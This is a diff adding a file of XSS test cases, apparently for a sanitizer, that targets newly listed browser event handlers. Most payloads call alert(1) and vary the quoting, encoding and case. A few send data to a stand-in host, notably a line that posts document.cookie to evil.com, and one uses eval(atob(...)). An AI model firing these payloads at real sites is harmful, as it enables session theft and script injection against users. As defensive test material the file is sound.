@@ -1,0 +1,477 @@
+#
+# XSS Test Cases for 2025 Event Handler Updates
+#
+# This file contains test cases for newly added event handlers from:
+# - WebKit EventNames.json
+# - Chromium/Blink GlobalEventHandlers.idl
+# - Firefox/Gecko EventNameList.h
+#
+# Updated: 2025-10-16
+#
+
+#
+# New Event Handlers - Standard Format Tests
+# Each event handler is tested in multiple contexts:
+# - As an attribute
+# - In unquoted value context
+# - In single-quoted value context
+# - In double-quoted value context
+#
+
+#
+# ACCESSKEYNOTFOUND (Firefox)
+#
+<img onaccesskeynotfound=alert(1)>
+<div onaccesskeynotfound=alert(1)>
+x onaccesskeynotfound=alert(1)>
+x' onaccesskeynotfound=alert(1)>
+x" onaccesskeynotfound=alert(1)>
+
+#
+# AFTERPAINT (Firefox)
+#
+<body onafterpaint=alert(1)>
+<img onafterpaint=alert(1)>
+
+#
+# AFTERSCRIPTEXECUTE (Firefox)
+#
+<script onafterscriptexecute=alert(1)>
+<div onafterscriptexecute=alert(1)>
+
+#
+# AUDIOCOMPLETE (Firefox)
+#
+<audio onaudiocomplete=alert(1)>
+<div onaudiocomplete=alert(1)>
+
+#
+# AUXCLICK (Chromium, WebKit)
+#
+<button onauxclick=alert(1)>
+<div onauxclick=alert(1)>
+<a onauxclick=alert(1)>
+
+#
+# BEFOREMATCH (Chromium, WebKit, Firefox)
+#
+<div onbeforematch=alert(1)>
+<span onbeforematch=alert(1)>
+
+#
+# BEFORESCRIPTEXECUTE (Firefox)
+#
+<script onbeforescriptexecute=alert(1)>
+<div onbeforescriptexecute=alert(1)>
+
+#
+# COMMAND (Chromium, WebKit, Firefox)
+#
+<button oncommand=alert(1)>
+<input oncommand=alert(1)>
+
+#
+# COMPOSITIONCHANGE (Firefox)
+#
+<input oncompositionchange=alert(1)>
+<textarea oncompositionchange=alert(1)>
+
+#
+# CONTEXTLOST (Chromium, WebKit, Firefox)
+#
+<canvas oncontextlost=alert(1)>
+<div oncontextlost=alert(1)>
+
+#
+# CONTEXTRESTORED (Chromium, WebKit, Firefox)
+#
+<canvas oncontextrestored=alert(1)>
+<div oncontextrestored=alert(1)>
+
+#
+# DEVICELIGHT (Firefox)
+#
+<body ondevicelight=alert(1)>
+<div ondevicelight=alert(1)>
+
+#
+# DEVICEORIENTATIONABSOLUTE (Firefox)
+#
+<body ondeviceorientationabsolute=alert(1)>
+
+#
+# DRAGEXIT (Chromium, Firefox)
+#
+<div ondragexit=alert(1)>
+<img ondragexit=alert(1)>
+
+#
+# EDGEUI Events (Firefox)
+#
+<div onedgeuicanceled=alert(1)>
+<div onedgeuicompleted=alert(1)>
+<div onedgeuistarted=alert(1)>
+
+#
+# EDITOR Events (Firefox)
+#
+<div oneditorbeforeinput=alert(1)>
+<div oneditorinput=alert(1)>
+
+#
+# FENCEDTREECLICK (Chromium)
+#
+<div onfencedtreeclick=alert(1)>
+<fencedframe onfencedtreeclick=alert(1)>
+
+#
+# FORM Events (Firefox)
+#
+<form onformchange=alert(1)>
+<input onformcheckboxstatechange=alert(1)>
+<form onforminvalid=alert(1)>
+<input onformradiostatechange=alert(1)>
+<form onformreset=alert(1)>
+<form onformselect=alert(1)>
+<form onformsubmit=alert(1)>
+
+#
+# GAMEPAD Events (Firefox)
+#
+<body ongamepadaxismove=alert(1)>
+<body ongamepadbuttondown=alert(1)>
+<body ongamepadbuttonup=alert(1)>
+
+#
+# IMAGEABORT (Firefox)
+#
+<img onimageabort=alert(1)>
+
+#
+# LEGACY Events (Firefox - Deprecated DOM Events)
+#
+<div onlegacyattrmodified=alert(1)>
+<div onlegacycharacterdatamodified=alert(1)>
+<div onlegacydomactivate=alert(1)>
+<input onlegacydomfocusin=alert(1)>
+<input onlegacydomfocusout=alert(1)>
+<div onlegacymouselineorpagescroll=alert(1)>
+<div onlegacymousepixelscroll=alert(1)>
+<div onlegacynodeinserted=alert(1)>
+<div onlegacynodeinsertedintodocument=alert(1)>
+<div onlegacynoderemoved=alert(1)>
+<div onlegacynoderemovedfromdocument=alert(1)>
+<div onlegacysubtreemodified=alert(1)>
+<input onlegacytextinput=alert(1)>
+
+#
+# MAGNIFY GESTURE Events (Firefox)
+#
+<div onmagnifygesture=alert(1)>
+<div onmagnifygesturestart=alert(1)>
+<div onmagnifygestureupdate=alert(1)>
+
+#
+# MEDIARECORDER Events (Firefox)
+#
+<div onmediarecorderdataavailable=alert(1)>
+<div onmediarecorderstop=alert(1)>
+<div onmediarecorderwarning=alert(1)>
+
+#
+# MOUSE Events (Firefox)
+#
+<div onmousedoubleclick=alert(1)>
+<div onmouseexplorebytouch=alert(1)>
+<div onmousehittest=alert(1)>
+<div onmouselongtap=alert(1)>
+
+#
+# MOZ Prefixed Events (Firefox)
+#
+<div onmozfullscreenchange=alert(1)>
+<div onmozfullscreenerror=alert(1)>
+<div onmozpointerlockchange=alert(1)>
+<div onmozpointerlockerror=alert(1)>
+<div onmozvisualresize=alert(1)>
+<div onmozvisualscroll=alert(1)>
+
+#
+# OVERSCROLL (Chromium)
+#
+<div onoverscroll=alert(1)>
+
+#
+# PAGE Events (WebKit)
+#
+<body onpagereveal=alert(1)>
+<body onpageswap=alert(1)>
+
+#
+# POINTER Events (Firefox)
+#
+<div onpointerauxclick=alert(1)>
+<div onpointerclick=alert(1)>
+<div onpointergotcapture=alert(1)>
+<div onpointerlostcapture=alert(1)>
+<div onpointerrawupdate=alert(1)>
+
+#
+# PRESS TAP GESTURE (Firefox)
+#
+<div onpresstapgesture=alert(1)>
+
+#
+# REDRAW (WebKit)
+#
+<div onredraw=alert(1)>
+
+#
+# REPEAT Events (SVG Animation - WebKit, Firefox)
+#
+<animate onrepeat=alert(1)>
+<animateMotion onrepeatevent=alert(1)>
+
+#
+# ROTATE GESTURE Events (Firefox)
+#
+<div onrotategesture=alert(1)>
+<div onrotategesturestart=alert(1)>
+<div onrotategestureupdate=alert(1)>
+
+#
+# SCROLL Events
+#
+<div onscrolledareachanged=alert(1)>
+<div onscrollend=alert(1)>
+<div onscrollportoverflow=alert(1)>
+<div onscrollportunderflow=alert(1)>
+<div onscrollsnapchange=alert(1)>
+<div onscrollsnapchanging=alert(1)>
+
+#
+# SMIL Events (SVG/SMIL Animation - Firefox)
+#
+<animate onsmilbeginevent=alert(1)>
+<animate onsmilendevent=alert(1)>
+<animate onsmilrepeatevent=alert(1)>
+
+#
+# SORT (Chromium)
+#
+<table onsort=alert(1)>
+<div onsort=alert(1)>
+
+#
+# SVG Events (Firefox)
+#
+<svg onsvgload=alert(1)>
+<svg onsvgscroll=alert(1)>
+
+#
+# SWIPE GESTURE Events (Firefox)
+#
+<div onswipegesture=alert(1)>
+<div onswipegestureend=alert(1)>
+<div onswipegesturemaystart=alert(1)>
+<div onswipegesturestart=alert(1)>
+<div onswipegestureupdate=alert(1)>
+
+#
+# TAP GESTURE (Firefox)
+#
+<div ontapgesture=alert(1)>
+
+#
+# UNIDENTIFIED EVENT (Firefox)
+#
+<div onunidentifiedevent=alert(1)>
+
+#
+# USERPROXIMITY (Firefox - Deprecated)
+#
+<body onuserproximity=alert(1)>
+
+#
+# VR DISPLAY Events (Firefox - WebVR Deprecated)
+#
+<body onvrdisplayactivate=alert(1)>
+<body onvrdisplayconnect=alert(1)>
+<body onvrdisplaydeactivate=alert(1)>
+<body onvrdisplaydisconnect=alert(1)>
+<body onvrdisplaypresentchange=alert(1)>
+
+#
+# WEBKIT Prefixed Events
+#
+<form onwebkitassociateformcontrols=alert(1)>
+<input onwebkitautofillrequest=alert(1)>
+<video onwebkitmediasessionmetadatachanged=alert(1)>
+<div onwebkitshadowrootattached=alert(1)>
+
+#
+# XUL Events (Firefox - XUL Specific)
+#
+<div onxulbroadcast=alert(1)>
+<div onxulcommandupdate=alert(1)>
+<div onxulpopuphidden=alert(1)>
+<div onxulpopuphiding=alert(1)>
+<div onxulpopupshowing=alert(1)>
+<div onxulpopupshown=alert(1)>
+<div onxulsystemstatusbarclick=alert(1)>
+
+#
+# Complex Context Tests
+# Testing new events in various XSS contexts
+#
+
+# URL context with new events
+<a href="x" onauxclick=alert(1)>click</a>
+<img src="x" oncontextlost=alert(1)>
+<video src="x" oncontextrestored=alert(1)>
+
+# Form context
+<input type="text" onbeforematch=alert(1)>
+<textarea oncompositionchange=alert(1)></textarea>
+<button oncommand=alert(1)>Submit</button>
+
+# SVG context
+<svg><animate onrepeat=alert(1)/></svg>
+<svg><animateMotion onrepeatevent=alert(1)/></svg>
+<svg onsvgload=alert(1)><rect/></svg>
+
+# Mixed case variations
+<div OnAuxClick=alert(1)>
+<img ONCONTEXTLOST=alert(1)>
+<button onCoMmAnD=alert(1)>
+
+# With HTML encoding
+<img on&#97;uxclick=alert(1)>
+<div on&#x62;eforematch=alert(1)>
+
+# In attribute injection context
+' onauxclick=alert(1) x='
+" onbeforematch=alert(1) x="
+ oncommand=alert(1) x=
+
+# Multiple events
+<div onauxclick=alert(1) onbeforematch=alert(2)>
+<button oncommand=alert(1) oncontextlost=alert(2)>
+
+# Event handler values with special characters
+<img onauxclick=alert(String.fromCharCode(88,83,83))>
+<div onbeforematch=alert`1`>
+<button oncommand=alert&#40;1&#41;>
+
+# Case insensitivity
+<img OnAuXcLiCk=alert(1)>
+<div onBeFoReMaTcH=alert(1)>
+
+# With whitespace
+<img onauxclick = alert(1)>
+<div onbeforematch =alert(1)>
+<button oncommand= alert(1)>
+
+# Injection in different quote contexts
+"><img onauxclick=alert(1)>
+'><img onbeforematch=alert(1)>
+><button oncommand=alert(1)>
+
+# In style and script breaking contexts
+</style><img onauxclick=alert(1)>
+</script><img onbeforematch=alert(1)>
+
+# Modern browser-specific events with payloads
+<fencedframe onfencedtreeclick=fetch('//evil.com?c='+document.cookie)>
+<div onscrollsnapchange=eval(atob('YWxlcnQoMSk='))>
+<table onsort=Function('alert(1)')()>
+
+# Progressive Web App related
+<div onpagereveal=alert(1)>
+<div onpageswap=alert(1)>
+
+# Touch and gesture events
+<div ontapgesture=alert(1)>
+<div onswipegesture=alert(1)>
+<div onpresstapgesture=alert(1)>
+<div onrotategesture=alert(1)>
+<div onmagnifygesture=alert(1)>
+
+# Gamepad API events
+<body ongamepadbuttondown=fetch('//evil.com')>
+<div ongamepadaxismove=alert(document.domain)>
+
+# Media events
+<div onmediarecorderdataavailable=alert(1)>
+<video onwebkitmediasessionmetadatachanged=alert(1)>
+
+# Scroll snap events (CSS Scroll Snap)
+<div onscrollsnapchange=alert(1) style="scroll-snap-type:y mandatory">
+<div onscrollsnapchanging=alert(1) style="overflow:scroll">
+
+# Pointer events raw update
+<canvas onpointerrawupdate=alert(1)>
+
+# Legacy DOM mutation events (deprecated but may still work)
+<div onlegacydomactivate=alert(1)>
+<div onlegacysubtreemodified=alert(1)>
+<div onlegacynodeinserted=alert(1)>
+
+# Editor events
+<div contenteditable oneditorinput=alert(1)>
+<div contenteditable oneditorbeforeinput=alert(1)>
+
+# Form state change events
+<input type="checkbox" onformcheckboxstatechange=alert(1)>
+<input type="radio" onformradiostatechange=alert(1)>
+
+# WebGL context events
+<canvas oncontextlost=alert(1)></canvas>
+<canvas oncontextrestored=alert(1)></canvas>
+
+# Device orientation and light
+<body ondeviceorientationabsolute=alert(1)>
+<body ondevicelight=alert(1)>
+
+# Real-world attack scenarios with new events
+
+# Breaking out of attribute context
+value" onauxclick="alert(1)
+name' onbeforematch='alert(1)
+id oncommand=alert(1) data="
+
+# Escaping JavaScript string in event handler
+<img onauxclick="var x=''; alert(1); var y='">
+<div onbeforematch='var x=""; alert(1); var y=""'>
+
+# Using in data attributes
+<div data-action="submit" onauxclick=alert(1)>
+<button data-cmd="save" oncommand=eval(this.dataset.cmd)>
+
+# Combining with other XSS vectors
+<svg><use href="#x" onauxclick=alert(1)></svg>
+<math><mtext onbeforematch=alert(1)>text</mtext></math>
+
+# Browser-specific edge cases
+<div onmozvisualscroll=alert(1)>Mozilla</div>
+<div onwebkitshadowrootattached=alert(1)>WebKit</div>
+<input onwebkitautofillrequest=alert(1)>
+
+# Event handler in template and slot
+<template><div onauxclick=alert(1)></div></template>
+<slot onbeforematch=alert(1)></slot>
+
+# With shadow DOM
+<div onwebkitshadowrootattached=alert(1)></div>
+
+# Form-associated custom elements
+<form onformsubmit=alert(1)>
+<form onformreset=alert(1)>
+
+# Intersection and resize observers contexts
+<div onredraw=alert(1)>
+<div onscrollend=alert(1)>
+
+# VR/AR contexts (deprecated but may exist)
+<div onvrdisplayactivate=alert(1)>
+<div onvrdisplaypresentchange=alert(1)>
